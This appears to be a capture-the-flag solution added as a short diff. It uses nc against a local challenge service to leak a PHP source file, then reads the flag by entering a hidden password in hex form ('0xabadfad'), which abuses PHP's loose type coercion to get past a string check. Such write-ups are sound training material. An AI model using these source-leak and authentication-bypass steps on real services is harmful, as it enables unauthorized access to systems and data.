@@ -1,0 +1,17 @@
+Step 1: Leak source.
+
+nc localhost 5665
+4
+pps.php
+2
+
+
+Step 2: Leak flag.
+
+With the source, find the hidden password, evade the string matching via PHP's awesome forced coersion:
+
+nc localhost 5665
+5
+0xabadfad
+flag
+2
